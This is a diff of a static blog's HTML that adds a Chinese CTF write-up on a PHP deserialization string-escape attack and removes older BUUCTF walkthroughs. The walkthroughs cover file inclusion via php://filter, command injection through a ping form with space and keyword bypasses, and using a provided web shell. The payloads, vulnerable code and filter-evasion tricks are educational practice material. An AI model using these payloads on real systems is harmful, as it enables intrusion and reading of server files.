class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">			&lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Photo:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这是更新profile的源码。限制：</p>
+<p>1.电话号码的长度应为11；</p>
+<p>2.nickname长度小于 10 位，且只能为字母和数字；（注意此处的<code>^</code>，这个正则的意思是匹配除了a-zA-Z0-9_之外的字符,因为 <code>^</code> 符号是在 <code>[]</code>里面，所以是非的意思，不是开始的意思。）</p>
+<p>3.对上传的信息进行了序列化。</p>
+<p>看到这里的时候我还以为会不会是文件上传漏洞，上传一句话木马，但是发现他没有告诉我们文件上传地址，因此无法进一步操作，那就接着往下看吧</p>
+<p><strong>profile.php</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	<span class="keyword">if</span>($profile  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		$email = $profile[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">		&lt;h3&gt;Hi <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nickname;<span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">		&lt;label&gt;Phone: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $phone;<span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">		&lt;label&gt;Email: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $email;<span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先判断参数profile的值是否为空，不为空则反序列化profile，然后把对应值回显到网页上</p>
+<p><strong>我们先在来梳理一下思路：</strong></p>
+<p>1.flag在config.php文件里，但是我们无法直接获取flag；</p>
+<p>2.update.php对上传的数据做序列化处理；</p>
+<p>3.profile.php会把update的数据反序列化然后回显到网页上，并且参数photo会以base64的方式读取上传图片；</p>
+<p>4.nickname长度小于 10 位，且只能为字母和数字。</p>
+<p>据此我们会想能不能利用file_get_contents函数获取服务器端的config.php文件，这就涉及到了<strong>反序列化字符逃逸</strong>。</p>
+<p><strong>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的</strong></p>
+<p>如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o:1:&#123;s:4:&quot;name&quot;;s:6:&quot;linbei&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>篡改name的值，在name的地方输入<code>name&quot;;s:5:&quot;linmu&quot;;&#125;</code>，则序列化后变成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o:1:&#123;s:19:&quot;name&quot;;s:5:&quot;linmu&quot;;&#125;&quot;;s:6:&quot;linbei&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们看到第一个s的值原本是4的但是此时却是19，那么这样的字符串反序列化后<code>&quot;;s:6:&quot;linbei&quot;;&#125;</code>还是无法逃逸，也就是说<code>s:5:&quot;linmu&quot;</code>没有顶替其的位置，但是好在class.php文件中有filter，我们可以利用filter的功能把字符串中存在的<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>替换成<code>&#39;hacker&#39;</code>，其中符合替换后长度增加的只有<code>where</code>。</p>
+<p>我们希望上传后数据序列化变成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:11:&quot;11111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:38:&quot;abc&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:*:******;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是把原本$photo对应序列化的值顶掉，换成我们希望的config.php，那么我们要让<code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>逃逸</p>
+<p><code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>长度为34，当字符串中出现一个where时，替换后增加一个长度，当出现34个where时，那么字符串增加34个长度，此时读取量s不变，增加的长度就把<code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>顶出去了。</p>
+<p>但是这时又面临一个问题：nickname的值有长度限制，由于strlen()函数无法判别数组，因此我们可以抓包更改nickname属性为数组</p>
+<p>我们试着构造payload：</p>
+<p>$phone =<code> 11111111111</code><br>$email = <code>11111@qq.com</code><br>$nickname[] = <code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code><br>$photo = 随便上传一个满足要求的文件</p>
+<p><img src="/2021/05/04/2021ISCC/13.png" alt="13"></p>
+<p>上传成功：<img src="/2021/05/04/2021ISCC/14.png" alt="14"></p>
+<p>base64解码：<img src="/2021/05/04/2021ISCC/15.png" alt="15"></p>
+<p>sp：部分函数的数组绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sha1(Array()) &#x3D; null</span><br><span class="line">ereg(pattern,Array()) &#x3D;null</span><br><span class="line">preg_match(pattern,Array()) &#x3D; false</span><br><span class="line">strcmp(Array(), “abc”) &#x3D;null</span><br><span class="line">strpos(Array(),“abc”) &#x3D; null</span><br><span class="line">strlen(Array()) &#x3D; null</span><br><span class="line">md5(Array()) &#x3D; null</span><br></pre></td></tr></table></figure>
+
+
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43622442/article/details/105751356">https://blog.csdn.net/qq_43622442/article/details/105751356</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43054896/article/details/105586792">https://blog.csdn.net/qq_43054896/article/details/105586792</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/05/04/2021ISCC/" data-id="ckp56fmwy0001rovu6ceg2dxa" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ISCC/" rel="tag">ISCC</a></li></ul>
 
     </footer>
   </div>
@@ -666,380 +848,6 @@
 
 
   
-    <article id="post-buuctf1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/04/05/buuctf1/" class="article-date">
-  <time datetime="2021-04-05T12:29:14.000Z" itemprop="datePublished">2021-04-05</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/05/buuctf1/">buuctf</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>点开容器，发现<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\1.png" alt="1"></p>
-<p>点击<code>tips</code><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\2.png" alt="2"></p>
-<p>发现是用文件包含的方式打开flag.php文件</p>
-<p>之前刷题有做过用php://filter读取文件源码，这题试一下</p>
-<p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\3.png" alt="3"></p>
-<p>用base64-decode</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">&quot;php://input&quot;</span>) || stristr($file,<span class="string">&quot;zip://&quot;</span>) || stristr($file,<span class="string">&quot;phar://&quot;</span>) || stristr($file,<span class="string">&quot;data:&quot;</span>))&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>index.php里没内容，看一下flag.php里的</p>
-<p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\4.png" alt="4"></p>
-<p>用base64-decode</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;ce69e052-72a5-4f31-b4f7-d618aa394082&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>点开容器，发现什么也没有，用御剑跑了一下，发现容易服务器崩，线程少又跑的慢，点击查看源码<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\5.png" alt="5"></p>
-<p>点开箭头所指链接<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\6.png" alt="6"></p>
-<p>点开箭头所指链接，发现会302跳转到end.php说明这里面有猫腻</p>
-<p>burp抓包，发送到Repeater<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\7.png" alt="7"></p>
-<p>访问secr3t.php，得一段代码：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>secret<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag">    <span class="attr">highlight_file</span>(<span class="attr">__FILE__</span>);</span></span><br><span class="line"><span class="tag">    <span class="attr">error_reporting</span>(<span class="attr">0</span>);</span></span><br><span class="line"><span class="tag">    $<span class="attr">file</span>=<span class="string">$_GET[</span>&#x27;<span class="attr">file</span>&#x27;];</span></span><br><span class="line"><span class="tag">    <span class="attr">if</span>(<span class="attr">strstr</span>($<span class="attr">file</span>,&quot;<span class="attr">..</span>/&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>, &quot;<span class="attr">tp</span>&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>,&quot;<span class="attr">input</span>&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>,&quot;<span class="attr">data</span>&quot;))&#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">echo</span> &quot;<span class="attr">Oh</span> <span class="attr">no</span>!&quot;;</span></span><br><span class="line"><span class="tag">        <span class="attr">exit</span>();</span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">    <span class="attr">include</span>($<span class="attr">file</span>); </span></span><br><span class="line"><span class="tag">//<span class="attr">flag</span>放在了<span class="attr">flag.php</span>里</span></span><br><span class="line"><span class="tag">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>这里进行下一步的时候我放了一个错误，我知道要用php://filter读取flag文件，但是错误的在index.php后传参的，</p>
-<p>也就是：<code>http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/?file=php://filter/convert.base64-encode/resource=flag.php </code>这样是错误的，因为index.php没有文件包含，</p>
-<p>因此我们要改成：<code>http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php </code></p>
-<p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\8.png" alt="8"></p>
-<p>对箭号所指的字符串base64解码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">            echo &quot;æå°±å¨è¿é&quot;;</span><br><span class="line">            $flag &#x3D; &#39;flag&#123;c2a2c0e2-6076-4c2a-a387-f45b291c0978&#125;&#39;;</span><br><span class="line">            $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>得flag</p>
-<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>点开容器，发现一个ping窗口</p>
-<p>ping一下容器地址<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\9.png" alt="9"></p>
-<p>回顾一下系统命令的<code>管道符</code></p>
-<p>1、<code>|</code>（就是按位或），直接执行|后面的语句 </p>
-<p>2、<code>||</code>（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句 </p>
-<p>3、<code>&amp;</code>（就是按位与），&amp;前面和后面命令都要执行，无论前面真假 4、<code>&amp;&amp;</code>（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令 </p>
-<p>5、<code>; </code>前后都执行，无论前面真假，同&amp;，（linux也有）</p>
-<p>ping: <code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls</code>——查看当前目录下的文件</p>
-<p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\9.png" alt="9"></p>
-<p>看来flag不在当前目录下</p>
-<p>ping: <code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls /</code>——查看根目录下的文件</p>
-<p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\10.png" alt="10"></p>
-<p>我们看到在根目录下存在一个名为flag的文件</p>
-<p>ping：<code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn | cat /flag</code></p>
-<p>得flag</p>
-<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>点开容器</p>
-<p><strong>直接开始ping</strong></p>
-<p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\11.png" alt="11"></p>
-<p><strong>发现不能payload里面不能有空格</strong><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\12.png" alt="12"></p>
-<p><strong>补充一个知识点（命令执行空格绕过）</strong>：</p>
-<p><code> &lt;</code> <code>&lt;&gt;</code> <code>&gt;</code> 重定向符<br> <code>%09</code>(需要php环境)<br> <code>$&#123;IFS&#125; </code><br> <code>$IFS$9</code><br> <code>&#123;cat,flag.php&#125;</code>  //用逗号实现了空格功能<br> <code>%20 </code></p>
-<p><strong>那么我们尝试用重定向符绕过</strong><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\13.png" alt="13"></p>
-<p>发现部分符号也被禁用了，</p>
-<p>那么我们尝试用<code>$IFS$9</code>绕过，绕过成功，尝试cat flag<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\14.png" alt="14"></p>
-<p>发现flag都被禁了，那我们cat index.php，得一段代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>我们可以看到它禁用了很多的符号，这边要注意它严格过滤了flag——只要字符串中有按顺序存在<code>f</code> <code>l</code> <code>a</code> <code>g</code>就会被警告</p>
-<p><strong>法1</strong>：由于存在shell_exec，我们可以尝试设参，如构造payload：<code>?ip=127.0.0.1;m=ag;n=fl;cat$IFS$9$n$m.php</code></p>
-<p>这句话其实在终端就执行了两句话，一个是ping端口127.0.0.1，另一个是执行cat flag.php文件。中间两句是设置变量赋值。</p>
-<p><strong>法2：</strong>内联执行</p>
-<p>反引号在linux中作为内联执行，执行输出结果。也就是说</p>
-<p> cat  ```ls` ``——先执行ls，输出 index.php 和 flag.php 。然后再执行 cat index.php;cat flag.php</p>
-<p>这样查看返回页面的源码，得：<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\15.png" alt="15"></p>
-<p>参考：</p>
-<p>命令执行绕过：<a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/12/09/5dee4883dad99/">https://www.dazhuanlan.com/2019/12/09/5dee4883dad99/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
-<p>wp：<a target="_blank" rel="noopener" href="https://blog.csdn.net/vanarrow/article/details/108295481">https://blog.csdn.net/vanarrow/article/details/108295481</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46184013/article/details/107061110?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control&amp;dist_request_id=1328767.72324.16177154446992417&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control">https://blog.csdn.net/qq_46184013/article/details/107061110?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control&amp;dist_request_id=1328767.72324.16177154446992417&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control</a></p>
-<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p>点开容器，发现直接给了我们一句话木马</p>
-<p>我们用蚁剑连接，密码Syc</p>
